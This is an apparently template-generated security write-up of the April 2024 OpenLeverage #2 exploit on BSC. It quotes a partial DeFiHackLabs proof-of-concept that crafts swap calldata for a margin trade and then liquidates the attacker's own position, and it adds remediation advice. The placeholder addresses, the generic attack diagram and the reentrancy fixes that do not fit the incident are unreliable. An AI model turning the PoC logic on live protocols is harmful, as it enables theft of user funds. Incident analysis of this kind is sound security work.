# OpenLeverage #2 — Oracle Manipulation Analysis During Leverage Position Liquidation

| Field | Details |
|------|------|
| **Date** | 2024-04-12 |
| **Protocol** | OpenLeverage #2 |
| **Chain** | BSC |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://bscscan.com/address/0x) |
| **Attack Tx** | [0x](https://bscscan.com/tx/0x) |
| **Vulnerable Contract** | [0x](https://bscscan.com/address/0x) |
| **Root Cause** | Oracle manipulation during leverage position liquidation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/OpenLeverage2_exp.sol) |

---
## 1. Vulnerability Overview

OpenLeverage #2 is a DeFi protocol operating on the BSC chain that suffered a **price manipulation liquidation** attack on 2024-04-12.
The attacker exploited oracle manipulation during leverage position liquidation, causing an estimated **unconfirmed** loss.

### Key Vulnerability Summary
- **Classification**: Price manipulation liquidation
- **Impact**: Unconfirmed protocol asset loss
- **Attack Vector**: Oracle manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ Comments)

```solidity
// ❌ Vulnerable implementation example
// Issue: Oracle manipulation during leverage position liquidation
// The attacker exploits this logic to obtain illegitimate profit

// OpenLeverage interface — oracle manipulation liquidation vulnerable functions
interface ITradeController {
    // ❌ Vulnerable: marginTrade creates leverage positions based on spot price
    // After manipulating price via flash loan, can force liquidation by reaching the liquidation threshold
    function marginTrade(
        uint16 marketId,
        bool longToken,
        bool depositToken,
        uint256 deposit,
        uint256 borrow,
        uint256 deadLine,
        bytes calldata dexData
    ) external payable returns (uint256);

    // ❌ Vulnerable: payoffTrade uses manipulated oracle price during liquidation
    function payoffTrade(uint16 marketId, bool longToken) external payable;
    function activeTrades(address, uint16, bool) external view returns (uint256, uint256, bool, uint128);
    function markets(uint16) external view returns (address, address, address, address, uint16, uint16, uint16, address, uint256, uint256);
    function getCash() external view returns (uint256);
}

interface IOPBorrowingDelegator {
    // ❌ Vulnerable: liquidate determines undercollateralization using spot price
    function liquidate(uint16 marketId, bool longToken, address borrower) external;
    function borrow(uint16 marketId, bool longToken, uint256 borrowing, uint256 collateral) external payable;
}

// ✅ Correct implementation: TWAP-based liquidation price validation
function safeLiquidate(uint16 marketId, bool longToken, address borrower) external {
    // ✅ Use TWAP instead of spot price to determine liquidation eligibility
    uint256 twapPrice = getTWAPPrice(marketId, TWAP_PERIOD);
    uint256 spotPrice = getSpotPrice(marketId);
    // ✅ If deviation between spot and TWAP is large, treat as price manipulation and block liquidation
    require(
        abs(spotPrice - twapPrice) * 100 / twapPrice <= MAX_LIQUIDATION_DEVIATION,
        "Liquidate: price manipulation detected"
    );
    _executeLiquidation(marketId, longToken, borrower, twapPrice);
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Identify Vulnerability] ─────── OpenLeverage #2 Contract
  │
  ▼
[Send Malicious Transaction] ─── Call Vulnerable Function
  │                                (Bypass Validation)
  ▼
[Drain Assets] ──────────────── Secure Profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - OpenLeverage2_exp.sol
// Chain: BSC | Date: 2024-04-12

    function testExploit() public {
        // First TX
        deal(address(this), 5 ether);
        emit log_named_decimal_uint("Exploiter BNB balance before attack", address(this).balance, 18);

        USDC.approve(address(Router), type(uint256).max);
        BUSDT.approve(address(Router), type(uint256).max);

        WBNBToOLE();
        // Add liquidity to pair
        OLE.transfer(address(USDC_OLE), OLE.balanceOf(address(this)));
        USDC.transfer(address(USDC_OLE), USDC.balanceOf(address(this)));
        USDC_OLE.mint(address(this));

        // Deposit and lock liquidity
        USDC_OLE.approve(address(xOLE), USDC_OLE.balanceOf(address(this)));
        xOLE.create_lock(1, 1_814_400 + block.timestamp);

        (,,,, uint16 marginLimit, uint16 feesRate, uint16 priceDiffientRatio,,,) = TradeController.markets(marketId);
        uint256 underlyingWBNBBal = LToken.getCash();
        if (underlyingWBNBBal > 1e14) {
            (bool success,) = address(LToken).call(abi.encodeWithSignature("accrueInterest()"));
            require(success, "Call to accrueInterest() not successful");
            uint256 availableBorrow = LToken.availableForBorrow();

            address[] memory path = new address[](3);
            path[0] = address(WBNB);
            path[1] = address(BUSDT);
            path[2] = address(WBNB);
            uint256[] memory amountsOut = Router.getAmountsOut(address(this).balance, path);
            uint256 amountToBorrow = (amountsOut[2] * 3000) / marginLimit;
            uint256[] memory amounts = WBNBToBUSDT();
            BUSDT.approve(address(TradeController), amounts[1]);

            Executor executor = new Executor();
            SwapDescription memory desc = SwapDescription({
                srcToken: address(WBNB),
                dstToken: address(BUSDT),
                srcReceiver: address(executor),
                dstReceiver: address(TradeController),
                amount: amountToBorrow,
                minReturnAmount: 1,
                flags: 4
            });
            bytes memory permit = "";
            bytes memory data =
                abi.encode(address(this), address(WBNB), address(BUSDT), 65_560, address(OPBorrowingDelegator));
            bytes memory swapData = abi.encodeWithSelector(bytes4(0x12aa3caf), address(executor), desc, permit, data);

            // First byte = Dex ID
            bytes memory dexData = abi.encodePacked(bytes5(hex"1500000002"), swapData);

            TradeController.marginTrade(marketId, true, true, amountsOut[1], amountToBorrow, 0, dexData);

            OPBorrowingDelegator.liquidate(marketId, true, address(this));
        }

        // Second TX
        vm.rollFork(37_470_331);

```

> **Note**: The above code is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Criterion | Details |
|-----------|------|
| **DASP Top 10** | Oracle Manipulation |
| **Attack Type** | AMM Manipulation |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | Medium |
| **Preconditions** | Access to vulnerable function |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to affected functions
2. **Assess damage**: Quantify lost assets and classify affected users
3. **Notify relevant parties**: Immediately notify related DEXs, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-term Improvements
- Conduct **independent security audits** (at least 2 audit firms)
- Run a **bug bounty program**
- Build a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Price manipulation liquidation attacks are preventable**: Defensible with proper validation and design patterns
2. **Consider economic incentives**: All functions must be designed with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets must be the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Establish a system to immediately detect abnormal large-scale transactions
2. **Incident response plan**: Maintain a response playbook that can be executed immediately upon an attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the Broader DeFi Ecosystem
- The **2024-04-12** OpenLeverage #2 incident reconfirms the danger of **price manipulation liquidation** attacks in the BSC ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Strengthening community-level security information sharing is recommended

---
*This document was written for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/OpenLeverage2_exp.sol)*